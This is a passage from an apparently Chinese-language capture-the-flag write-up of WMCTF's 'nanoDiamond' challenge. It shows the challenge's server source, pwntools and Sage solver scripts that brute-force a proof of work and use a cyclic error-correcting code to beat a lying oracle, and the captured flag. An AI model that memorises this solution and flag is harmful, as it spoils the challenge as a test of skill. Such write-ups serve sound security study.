== 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 0 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 0 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 0 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 0 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 0 and B3 == 1 and B4 == 1 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 0 and B4 == 1 and B5 == 1) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 0 and B5 == 0) or ( B0 == 1 and B1 == 1 and B2 == 1 and B3 == 1 and B4 == 1 and B5 == 1)&#x27;</span>]</span><br><span class="line">questions = [i.replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27; )&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> questions]</span><br><span class="line">dic = [<span class="string">&#x27;00000000000000&#x27;</span>, <span class="string">&#x27;00000111010001&#x27;</span>, <span class="string">&#x27;00001001110011&#x27;</span>, <span class="string">&#x27;00001110100010&#x27;</span>, <span class="string">&#x27;00010011100110&#x27;</span>, <span class="string">&#x27;00010100110111&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;00011010010101&#x27;</span>, <span class="string">&#x27;00011101000100&#x27;</span>, <span class="string">&#x27;00100000011101&#x27;</span>, <span class="string">&#x27;00100111001100&#x27;</span>, <span class="string">&#x27;00101001101110&#x27;</span>, <span class="string">&#x27;00101110111111&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;00110011111011&#x27;</span>, <span class="string">&#x27;00110100101010&#x27;</span>, <span class="string">&#x27;00111010001000&#x27;</span>, <span class="string">&#x27;00111101011001&#x27;</span>, <span class="string">&#x27;01000000111010&#x27;</span>, <span class="string">&#x27;01000111101011&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;01001001001001&#x27;</span>, <span class="string">&#x27;01001110011000&#x27;</span>, <span class="string">&#x27;01010011011100&#x27;</span>, <span class="string">&#x27;01010100001101&#x27;</span>, <span class="string">&#x27;01011010101111&#x27;</span>, <span class="string">&#x27;01011101111110&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;01100000100111&#x27;</span>, <span class="string">&#x27;01100111110110&#x27;</span>, <span class="string">&#x27;01101001010100&#x27;</span>, <span class="string">&#x27;01101110000101&#x27;</span>, <span class="string">&#x27;01110011000001&#x27;</span>, <span class="string">&#x27;01110100010000&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;01111010110010&#x27;</span>, <span class="string">&#x27;01111101100011&#x27;</span>, <span class="string">&#x27;10000001110100&#x27;</span>, <span class="string">&#x27;10000110100101&#x27;</span>, <span class="string">&#x27;10001000000111&#x27;</span>, <span class="string">&#x27;10001111010110&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;10010010010010&#x27;</span>, <span class="string">&#x27;10010101000011&#x27;</span>, <span class="string">&#x27;10011011100001&#x27;</span>, <span class="string">&#x27;10011100110000&#x27;</span>, <span class="string">&#x27;10100001101001&#x27;</span>, <span class="string">&#x27;10100110111000&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;10101000011010&#x27;</span>, <span class="string">&#x27;10101111001011&#x27;</span>, <span class="string">&#x27;10110010001111&#x27;</span>, <span class="string">&#x27;10110101011110&#x27;</span>, <span class="string">&#x27;10111011111100&#x27;</span>, <span class="string">&#x27;10111100101101&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;11000001001110&#x27;</span>, <span class="string">&#x27;11000110011111&#x27;</span>, <span class="string">&#x27;11001000111101&#x27;</span>, <span class="string">&#x27;11001111101100&#x27;</span>, <span class="string">&#x27;11010010101000&#x27;</span>, <span class="string">&#x27;11010101111001&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;11011011011011&#x27;</span>, <span class="string">&#x27;11011100001010&#x27;</span>, <span class="string">&#x27;11100001010011&#x27;</span>, <span class="string">&#x27;11100110000010&#x27;</span>, <span class="string">&#x27;11101000100000&#x27;</span>, <span class="string">&#x27;11101111110001&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;11110010110101&#x27;</span>, <span class="string">&#x27;11110101100100&#x27;</span>, <span class="string">&#x27;11111011000110&#x27;</span>, <span class="string">&#x27;11111100010111&#x27;</span>]</span><br><span class="line"><span class="comment"># 1.13.154.182:30310</span></span><br><span class="line">r = remote(<span class="string">&#x27;1.13.154.182&#x27;</span>, <span class="number">30310</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># proof of work</span></span><br><span class="line">proof = r.recvuntil(<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(proof)</span><br><span class="line">tail = proof[<span class="number">12</span>:<span class="number">28</span>].decode()</span><br><span class="line">_<span class="built_in">hash</span> = proof[<span class="number">33</span>:<span class="number">97</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(tail)</span><br><span class="line"><span class="built_in">print</span>(_<span class="built_in">hash</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始爆破！&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):</span><br><span class="line">    head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> t == _<span class="built_in">hash</span>:</span><br><span class="line">        r.sendline(head.encode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;爆破成功！结果是：&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(head)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">        <span class="comment"># r.recvuntil(&quot;Question: &quot;)</span></span><br><span class="line">        <span class="comment"># r.send(questions[j])</span></span><br><span class="line">        r.sendlineafter(<span class="string">&quot;Question: &quot;</span>, questions[j])</span><br><span class="line">        r.recvuntil(<span class="string">&quot;Answer: &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;True&#x27;</span> <span class="keyword">in</span> r.recvuntil(<span class="string">&quot;!&quot;</span>):</span><br><span class="line">            msg += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):  <span class="comment"># 32*2 = 64</span></span><br><span class="line">        <span class="keyword">if</span> (dif(msg, dic[j]) &lt;= <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> dic[j][:<span class="number">6</span>]:</span><br><span class="line">        ans += k + <span class="string">&quot; &quot;</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;chests:&quot;</span>, ans)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># You take all the treasure safe and sound. Head to the next vault!</span></span><br><span class="line"><span class="comment"># You&#x27;ve found all the treasure! WMCTF&#123;TERR4R1a_IS_4_LAND_0F_@DVENturE&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>WMCTF{TERR4R1a_IS_4_LAND_0F_@DVENturE}</p></blockquote><h3 id="nanoDiamond-rev"><a href="#nanoDiamond-rev" class="headerlink" title="nanoDiamond - rev"></a>nanoDiamond - rev</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, shuffle, choice</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span>.join([secrets.choice(string.digits + string.ascii_letters)</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;sha256(XXXX+<span class="subst">&#123;s[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;sha256(s.encode()).hexdigest()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;Give me XXXX: &#x27;</span>) != s[:<span class="number">4</span>]:</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ROUND_NUM = <span class="number">50</span></span><br><span class="line">PREROUND_NUM = <span class="number">13</span></span><br><span class="line">CHEST_NUM = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">white_list = [<span class="string">&#x27;==&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;B0&#x27;</span>,<span class="string">&#x27;B1&#x27;</span>,<span class="string">&#x27;B2&#x27;</span>,<span class="string">&#x27;B3&#x27;</span>,<span class="string">&#x27;B4&#x27;</span>,<span class="string">&#x27;B5&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">ans, chests, expr</span>):</span></span><br><span class="line">    B0, B1, B2, B3, B4, B5 = chests</span><br><span class="line">    <span class="keyword">return</span> ans(<span class="built_in">eval</span>(expr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span>():</span></span><br><span class="line">    chests = [choice((<span class="literal">True</span>, <span class="literal">False</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(CHEST_NUM)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Six chests lie here, with mimics or treasure hidden inside.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;But don&#x27;t worry. Skeleton Merchant knows what to do.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Be careful, Skeleton Merchant can lie twice!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    truth = <span class="keyword">lambda</span> r: <span class="keyword">not</span> <span class="keyword">not</span> r</span><br><span class="line">    lie = <span class="keyword">lambda</span> r: <span class="keyword">not</span> r</span><br><span class="line">    lie_num = randint(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">    lie_status = [truth] * (PREROUND_NUM - lie_num) + [lie] * lie_num</span><br><span class="line">    shuffle(lie_status)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(PREROUND_NUM):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            question = <span class="built_in">input</span>(<span class="string">&#x27;Question: &#x27;</span>).strip()</span><br><span class="line">            <span class="keyword">for</span> word <span class="keyword">in</span> question.split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">                <span class="keyword">assert</span> word <span class="keyword">in</span> white_list, <span class="string">f&quot;(<span class="subst">&#123;word&#125;</span>) No treasure for dirty hacker!&quot;</span></span><br><span class="line">            result = calc(lie_status[i], chests, question)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Answer: <span class="subst">&#123;result&#125;</span>!&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Skeleton Merchant fails to understand your words.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Now open the chests:&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> chests == <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().strip().split(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    proof_of_work()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Terraria is a land of adventure! A land of mystery!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Can you get all the treasure without losing your head?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUND_NUM):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">round</span>():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;A chest suddenly comes alive and BITE YOUR HEAD OFF.&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;You take all the treasure safe and sound. Head to the next vault!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;You&#x27;ve found all the treasure! <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p>简单入门<a href="https://www.bilibili.com/video/BV1yL4y1z7xK?spm_id_from=333.880.my_history.page.click&vd_source=18d124e8308f6dfeafbd61889c3142e1">循环码生成多项式</a>等概念与性质</p><p>题中n=13，k=6，而$x ^{13} - 1$或$x ^ { 13 } + 1$因式分解组合不出7（13-6）次多项式</p><p>随便找了个(15, 8)的生成多项式，无脑爆破</p><p>运气好，出了</p><p><strong>part1</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">R</span>.&lt;x&gt;= PolynomialRing(GF(<span class="number">2</span>))</span><br><span class="line"><span class="attribute">g</span> = x^<span class="number">7</span>+x^<span class="number">6</span>+x^<span class="number">4</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> n<span class="number">2</span>p(a):</span><br><span class="line">    <span class="attribute">a</span> = bin(a)[<span class="number">2</span>:]</span><br><span class="line">    <span class="attribute">p</span> = <span class="number">0</span></span><br><span class="line">    <span class="attribute">for</span> i in range(len(a)):</span><br><span class="line">        <span class="attribute">if</span> a[len(a) - i - <span class="number">1</span>] == &#x27;<span class="number">1</span>&#x27;:</span><br><span class="line">            <span class="attribute">p</span> += x ^ i</span><br><span class="line">    <span class="attribute">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> enc(i):</span><br><span class="line">    <span class="attribute">m</span> = n<span class="number">2</span>p(i)</span><br><span class="line">    <span class="attribute">c</span> = (x ^ <span class="number">7</span>) * m + (((x ^ <span class="number">7</span>) * m) % g)</span><br><span class="line">    <span class="attribute">return</span> <span class="string">&quot;&quot;</span>.join([str(int(i in c.exponents())) for i in range(<span class="number">13</span>)])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">dic</span> =<span class="meta"> []</span></span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">2</span> ** <span class="number">6</span>):</span><br><span class="line">    <span class="attribute">dic</span>.append(enc(i))</span><br><span class="line"></span><br><span class="line"><span class="attribute">part</span> = <span class="string">&quot;( B0 == &#123;&#125; and B1 == &#123;&#125; and B2 == &#123;&#125; and B3 == &#123;&#125; and B4 == &#123;&#125; and B5 == &#123;&#125;) &quot;</span></span><br><span class="line"><span class="attribute">questions</span> =<span class="meta"> []</span></span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">13</span>):</span><br><span class="line">    <span class="attribute">question</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="attribute">nums</span> =<span class="meta"> [j[:6] for j in dic if j[i] == &#x27;1&#x27;]</span></span><br><span class="line">    <span 